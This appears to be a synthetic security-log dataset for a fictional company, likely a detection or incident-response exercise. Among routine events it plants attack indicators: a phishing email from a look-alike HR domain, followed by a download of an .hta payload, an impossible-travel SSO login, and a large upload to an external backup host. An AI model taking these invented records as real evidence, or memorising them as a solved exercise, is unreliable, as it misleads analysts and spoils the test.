{"_time": "2026-10-02T00:31:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "GetCallerIdentity", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T00:40:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "kgupta", "src_ip": "10.10.65.40", "endpoint": "/api/profile", "method": "GET", "status": 200, "response_time_ms": 139, "auth_result": "n/a"}
{"_time": "2026-10-02T01:08:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.56.85", "dest_ip": "172.217.0.0", "dest_port": 443, "protocol": "TCP", "bytes_sent": 3788, "bytes_received": 117423}
{"_time": "2026-10-02T01:08:47Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-MKT-007", "EventCode": 4634, "TargetUserName": "tOlawale", "LogonId": "0x35821"}
{"_time": "2026-10-02T01:09:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "DescribeInstances", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T01:14:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "UPDATE", "table": "sessions", "rows_returned": 180, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T01:14:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ListBuckets", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T01:16:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "UPDATE", "table": "orders", "rows_returned": 17, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T01:18:38Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-IT-002", "EventCode": 4634, "TargetUserName": "intern_kpatel", "LogonId": "0x32ef9"}
{"_time": "2026-10-02T01:22:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.47.93", "query": "outlook.office365.com", "answer": "13.109.246.167", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T01:35:15Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.69.25", "url": "https://stackoverflow.com/questions/12345", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 1292}
{"_time": "2026-10-02T01:46:50Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-SALES-009", "EventCode": 4634, "TargetUserName": "tOlawale", "LogonId": "0x65a1a"}
{"_time": "2026-10-02T01:48:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.41", "query": "teams.microsoft.com", "answer": "13.61.160.40", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T02:09:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_accepted", "user": "pwong", "src_ip": "10.10.44.21", "method": "publickey"}
{"_time": "2026-10-02T02:17:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ListBuckets", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T02:32:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.60.53", "query": "outlook.office365.com", "answer": "13.86.211.126", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T02:38:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "audit_log", "rows_returned": 189, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T02:50:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-db01", "event": "sshd_accepted", "user": "dnair", "src_ip": "10.10.42.27", "method": "publickey"}
{"_time": "2026-10-02T02:52:48Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.47.96", "url": "https://outlook.office.com/mail/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 2040}
{"_time": "2026-10-02T02:53:05Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-HR-003", "EventCode": 4634, "TargetUserName": "dnair", "LogonId": "0x31227"}
{"_time": "2026-10-02T03:00:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.30.10", "dest_ip": "52.21.44.10", "dest_port": 443, "protocol": "TCP", "bytes_sent": 510000000, "bytes_received": 4200, "app": "backup-saas", "hostname": "backup.vendor-trusted.com"}
{"_time": "2026-10-02T03:08:00Z", "sourcetype": "email", "index": "web", "host": "MAIL-GW01", "sender": "notifications@slack.com", "recipient": "asmith@corp.local", "subject": "Automated notification", "attachment": "none", "url": "none", "spf": "pass", "dkim": "pass", "verdict": "clean"}
{"_time": "2026-10-02T03:18:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "GetCallerIdentity", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T03:22:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ListBuckets", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T03:24:57Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.58.34", "url": "https://outlook.office.com/mail/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 563}
{"_time": "2026-10-02T03:27:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.70.56", "query": "windowsupdate.microsoft.com", "answer": "13.89.182.40", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T03:29:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "INSERT", "table": "sessions", "rows_returned": 180, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T03:29:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "mchen", "src_ip": "10.10.60.29", "endpoint": "/api/notifications", "method": "GET", "status": 200, "response_time_ms": 298, "auth_result": "n/a"}
{"_time": "2026-10-02T03:29:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-db01", "event": "sshd_accepted", "user": "kgupta", "src_ip": "10.10.44.22", "method": "publickey"}
{"_time": "2026-10-02T03:33:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.69.68", "dest_ip": "13.107.42.14", "dest_port": 443, "protocol": "TCP", "bytes_sent": 5223, "bytes_received": 109473}
{"_time": "2026-10-02T03:34:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "inventory", "rows_returned": 69, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T03:46:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.46.50", "query": "outlook.office365.com", "answer": "13.107.138.244", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T03:48:17Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-ENG-021", "EventCode": 4634, "TargetUserName": "it_admin", "LogonId": "0xe7100"}
{"_time": "2026-10-02T03:50:44Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-HR-003", "EventCode": 4634, "TargetUserName": "pwong", "LogonId": "0xbf0c7"}
{"_time": "2026-10-02T04:04:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "inventory", "rows_returned": 79, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T04:04:08Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-IT-002", "EventCode": 4634, "TargetUserName": "kgupta", "LogonId": "0xba7b5"}
{"_time": "2026-10-02T04:08:34Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-IT-002", "EventCode": 4634, "TargetUserName": "jlopez", "LogonId": "0x348e2"}
{"_time": "2026-10-02T04:12:26Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.61.58", "url": "https://docs.google.com/document/d/abc123", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 4862}
{"_time": "2026-10-02T04:17:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.41.16", "query": "pypi.org", "answer": "13.78.179.242", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T04:28:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "tOlawale", "src_ip": "10.10.55.54", "endpoint": "/api/reports/weekly", "method": "GET", "status": 200, "response_time_ms": 201, "auth_result": "n/a"}
{"_time": "2026-10-02T04:36:42Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-MKT-007", "EventCode": 4634, "TargetUserName": "mchen", "LogonId": "0x3cbbe"}
{"_time": "2026-10-02T04:39:34Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.40.60", "url": "https://intranet.corp.local/wiki", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 4823}
{"_time": "2026-10-02T04:40:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.67.72", "query": "outlook.office365.com", "answer": "13.60.147.73", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T04:48:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ListBuckets", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T04:50:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-web02", "event": "sshd_accepted", "user": "kgupta", "src_ip": "10.10.44.26", "method": "publickey"}
{"_time": "2026-10-02T04:50:57Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-ENG-021", "EventCode": 4634, "TargetUserName": "asmith", "LogonId": "0x5f657"}
{"_time": "2026-10-02T04:51:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "INSERT", "table": "sessions", "rows_returned": 22, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T05:03:16Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.52.51", "url": "https://docs.google.com/document/d/abc123", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 3924}
{"_time": "2026-10-02T05:21:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "dnair", "src_ip": "10.10.62.73", "endpoint": "/api/reports/weekly", "method": "GET", "status": 200, "response_time_ms": 229, "auth_result": "n/a"}
{"_time": "2026-10-02T05:30:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "INSERT", "table": "audit_log", "rows_returned": 72, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T05:37:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "dnair", "src_ip": "10.10.60.72", "endpoint": "/api/dashboard", "method": "GET", "status": 200, "response_time_ms": 180, "auth_result": "n/a"}
{"_time": "2026-10-02T06:05:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.47.62", "query": "npmjs.org", "answer": "13.95.195.62", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T06:09:01Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.41.41", "url": "https://stackoverflow.com/questions/12345", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 796}
{"_time": "2026-10-02T06:19:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "DescribeInstances", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T06:27:50Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.58.87", "url": "https://outlook.office.com/mail/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 4009}
{"_time": "2026-10-02T06:52:55Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-FIN-014", "EventCode": 4634, "TargetUserName": "intern_kpatel", "LogonId": "0xdea70"}
{"_time": "2026-10-02T06:58:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "kgupta", "src_ip": "10.10.56.27", "endpoint": "/api/dashboard", "method": "GET", "status": 200, "response_time_ms": 130, "auth_result": "n/a"}
{"_time": "2026-10-02T07:07:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "INSERT", "table": "audit_log", "rows_returned": 156, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T07:08:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.55.95", "query": "outlook.office365.com", "answer": "13.96.243.56", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T07:14:01Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.61.34", "url": "https://stackoverflow.com/questions/12345", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 2889}
{"_time": "2026-10-02T07:24:44Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.44.37", "url": "https://news.ycombinator.com/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 3598}
{"_time": "2026-10-02T07:26:21Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-MKT-007", "EventCode": 4634, "TargetUserName": "dnair", "LogonId": "0x82e84"}
{"_time": "2026-10-02T07:29:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.60.42", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 8866, "bytes_received": 4463}
{"_time": "2026-10-02T07:36:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "dnair", "src_ip": "10.10.47.62", "endpoint": "/api/dashboard", "method": "GET", "status": 200, "response_time_ms": 141, "auth_result": "n/a"}
{"_time": "2026-10-02T07:37:20Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-HR-003", "EventCode": 4634, "TargetUserName": "jlopez", "LogonId": "0x5c592"}
{"_time": "2026-10-02T07:43:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "INSERT", "table": "orders", "rows_returned": 196, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T07:50:00Z", "sourcetype": "app:auth", "index": "cloud", "host": "SSO01", "username": "kgupta", "src_ip": "10.10.44.25", "geo": "Kathmandu,NP", "result": "success"}
{"_time": "2026-10-02T07:53:40Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.48.76", "url": "https://stackoverflow.com/questions/12345", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 2159}
{"_time": "2026-10-02T07:54:06Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-IT-002", "EventCode": 4634, "TargetUserName": "tOlawale", "LogonId": "0x76827"}
{"_time": "2026-10-02T07:56:00Z", "sourcetype": "email", "index": "web", "host": "MAIL-GW01", "sender": "updates@zoom.us", "recipient": "jlopez@corp.local", "subject": "Automated notification", "attachment": "none", "url": "none", "spf": "pass", "dkim": "pass", "verdict": "clean"}
{"_time": "2026-10-02T08:00:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "asmith", "src_ip": "10.10.40.20", "endpoint": "/api/login", "method": "POST", "status": 200, "response_time_ms": 129, "auth_result": "success"}
{"_time": "2026-10-02T08:00:00Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "DC01", "EventCode": 4768, "TargetUserName": "mchen", "IpAddress": "10.10.5.34", "ResultCode": "0x0"}
{"_time": "2026-10-02T08:00:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-web02", "event": "sshd_accepted", "user": "dnair", "src_ip": "10.10.44.33", "method": "publickey"}
{"_time": "2026-10-02T08:01:00Z", "sourcetype": "email", "index": "web", "host": "MAIL-GW01", "sender": "it-notifications@corp.local", "recipient": "asmith@corp.local", "subject": "Weekly IT Newsletter", "attachment": "none", "url": "none", "spf": "pass", "dkim": "pass", "verdict": "clean"}
{"_time": "2026-10-02T08:03:37Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-SALES-009", "EventCode": 1, "User": "CORP\\intern_kpatel", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T08:04:45Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\it_admin", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T08:05:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_accepted", "user": "dnair", "src_ip": "10.10.40.20", "method": "publickey", "pid": 1000}
{"_time": "2026-10-02T08:05:00Z", "sourcetype": "app:auth", "index": "cloud", "host": "SSO01", "username": "kgupta", "src_ip": "203.0.113.200", "geo": "Bucharest,RO", "result": "success"}
{"_time": "2026-10-02T08:10:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ConsoleLogin", "userIdentity_userName": "it_admin", "sourceIPAddress": "10.10.99.12", "awsRegion": "us-east-1", "responseElements_ConsoleLogin": "Success", "mfaUsed": "Yes"}
{"_time": "2026-10-02T08:10:24Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 1, "User": "CORP\\dnair", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T08:10:50Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.62.23", "url": "https://stackoverflow.com/questions/12345", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 517}
{"_time": "2026-10-02T08:11:37Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.70.43", "url": "https://news.ycombinator.com/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 1088}
{"_time": "2026-10-02T08:12:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_accepted", "user": "rfischer", "src_ip": "10.10.41.21", "method": "publickey", "pid": 1001}
{"_time": "2026-10-02T08:13:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "GetCallerIdentity", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T08:15:56Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-IT-002", "EventCode": 1, "User": "CORP\\it_admin", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T08:19:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_accepted", "user": "kgupta", "src_ip": "10.10.42.22", "method": "publickey", "pid": 1002}
{"_time": "2026-10-02T08:20:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "mchen", "src_ip": "10.10.64.61", "endpoint": "/api/dashboard", "method": "GET", "status": 200, "response_time_ms": 228, "auth_result": "n/a"}
{"_time": "2026-10-02T08:23:09Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-SALES-009", "EventCode": 4634, "TargetUserName": "rfischer", "LogonId": "0x2999a"}
{"_time": "2026-10-02T08:26:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_accepted", "user": "pwong", "src_ip": "10.10.43.23", "method": "publickey", "pid": 1003}
{"_time": "2026-10-02T08:28:04Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.62.46", "url": "https://docs.google.com/document/d/abc123", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 2425}
{"_time": "2026-10-02T08:33:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_accepted", "user": "tOlawale", "src_ip": "10.10.44.24", "method": "publickey", "pid": 1004}
{"_time": "2026-10-02T08:37:35Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-HR-003", "EventCode": 1, "User": "CORP\\intern_kpatel", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T08:51:20Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-HR-003", "EventCode": 1, "User": "CORP\\it_admin", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T08:53:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_accepted", "user": "kgupta", "src_ip": "10.10.43.40", "method": "publickey"}
{"_time": "2026-10-02T08:55:04Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.70.45", "url": "https://outlook.office.com/mail/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 4373}
{"_time": "2026-10-02T08:55:21Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 1, "User": "CORP\\mchen", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T08:57:22Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-IT-002", "EventCode": 1, "User": "CORP\\intern_kpatel", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T09:00:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.20", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 956, "bytes_received": 5278}
{"_time": "2026-10-02T09:00:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.40.20", "url": "https://intranet.corp.local/page0", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 567}
{"_time": "2026-10-02T09:00:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "orders", "rows_returned": 11, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T09:02:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sudo", "user": "dnair", "src_ip": "10.10.40.20", "command": "/usr/bin/systemctl restart nginx", "tty": "pts/1"}
{"_time": "2026-10-02T09:03:25Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-SALES-009", "EventCode": 1, "User": "CORP\\pwong", "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T09:10:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "mchen", "src_ip": "10.10.41.21", "endpoint": "/api/login", "method": "POST", "status": 200, "response_time_ms": 97, "auth_result": "success"}
{"_time": "2026-10-02T09:10:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "GetObject", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T09:12:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.52.71", "dest_ip": "13.107.42.14", "dest_port": 443, "protocol": "TCP", "bytes_sent": 8272, "bytes_received": 101972}
{"_time": "2026-10-02T09:14:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.52.98", "query": "teams.microsoft.com", "answer": "13.79.170.149", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T09:14:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.51.32", "query": "github.com", "answer": "13.60.182.137", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T09:15:00Z", "sourcetype": "email", "index": "web", "host": "MAIL-GW01", "sender": "payroll-noreply@corp-secure-hr.com", "recipient": "mchen@corp.local", "subject": "Action Required: Payroll Verification", "attachment": "Payroll_Form.html", "url": "https://corp-secure-hr.com/verify?id=88a1", "spf": "softfail", "dkim": "none", "verdict": "suspicious"}
{"_time": "2026-10-02T09:16:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.42.28", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 2569, "bytes_received": 80907}
{"_time": "2026-10-02T09:20:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "tOlawale", "src_ip": "10.10.42.28", "endpoint": "/api/login", "method": "POST", "status": 200, "response_time_ms": 177, "auth_result": "success"}
{"_time": "2026-10-02T09:20:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-web02", "event": "sshd_accepted", "user": "pwong", "src_ip": "10.10.41.16", "method": "publickey"}
{"_time": "2026-10-02T09:20:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "DescribeInstances", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T09:22:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.51.65", "dest_ip": "140.82.112.3", "dest_port": 443, "protocol": "TCP", "bytes_sent": 8501, "bytes_received": 141242}
{"_time": "2026-10-02T09:22:30Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.5.34", "url": "https://corp-secure-hr.com/verify?id=88a1", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 1200, "referrer": "outlook_webmail"}
{"_time": "2026-10-02T09:22:49Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-SALES-009", "EventCode": 1, "User": "CORP\\it_admin", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T09:23:10Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.5.34", "url": "https://corp-secure-hr.com/download/Payroll_Form.hta", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 42000}
